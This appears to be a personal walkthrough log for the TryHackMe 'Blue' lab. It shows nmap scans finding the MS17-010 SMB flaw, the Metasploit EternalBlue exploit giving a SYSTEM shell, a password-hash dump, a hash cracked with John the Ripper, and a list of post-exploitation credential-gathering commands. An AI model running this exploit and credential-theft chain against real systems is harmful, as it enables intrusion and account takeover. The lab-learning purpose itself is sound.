# https://tryhackme.com/room/blue
```bash
=================================
10.201.30.2 -- domain.com -- win/lin x32/x64
=================================

echo 'export TARGET=10.201.30.2' >> ~/.zshrc


sudo nmap -n -A -sS $TARGET
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp closed ms-wbt-server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 3 hops
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 16:ff:e6:ea:0d:33 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-28T16:38:44-05:00
| smb2-time: 
|   date: 2025-08-28T21:38:44
|_  start_date: 2025-08-28T20:52:22
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

2025-08-28 18:03:53 -- sudo nmap -n -Pn --script smb-vuln-ms17-010 $TARGET
\n##> 2025-08-28 18:03:11 ## sudo nmap -n -Pn --script smb-vuln-ms17-010 $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 18:03 EDT
Nmap scan report for 10.201.30.2
Host is up (0.11s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

### MSFCONSOLE
use exploit/windows/smb/ms17_010_eternalblue
setg RHOSTS 10.201.30.2
setg LHOST 10.6.4.0  // used VPN tun0 IP
2025-08-28 18:11:40 -- exploit
// success with normal shell

### UPGRADE SHELL
https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html
use post/multi/manage/shell_to_meterpreter
set SESSION 1
2025-08-28 18:19:49 -- run
// success
2025-08-28 18:22:48 -- sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
2025-08-28 18:21:07 -- getuid
Server username: NT AUTHORITY\SYSTEM
2025-08-28 18:26:20 -- me 
 2244  2540  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
2025-08-28 18:37:44 -- hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

2025-08-28 18:39:55 -- john --format=nt jon_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
alqfna22         (Jon)     
2025-08-28 18:43:01 -- search -d c:\\ -f root.txt -f user.txt -f flag.txt
// nothing
2025-08-28 19:25:56 -- search -d c:\\ -f flag1.txt -f flag2.txt -f flag3.txt
==================
Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 15:26:36 -0400
c:\Windows\System32\config\flag2.txt  34            2019-03-17 15:32:48 -0400
c:\flag1.txt                          24            2019-03-17 15:27:21 -0400

2025-08-28 18:44:35 -- run winenum
# --- Basic System Survey ---
sysinfo
getuid
getpid
ipconfig
ps
run winenum
run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
# --- Privilege Escalation & Credential Gathering ---
run post/windows/gather/smart_hashdump
run post/multi/recon/local_exploit_suggester
###
```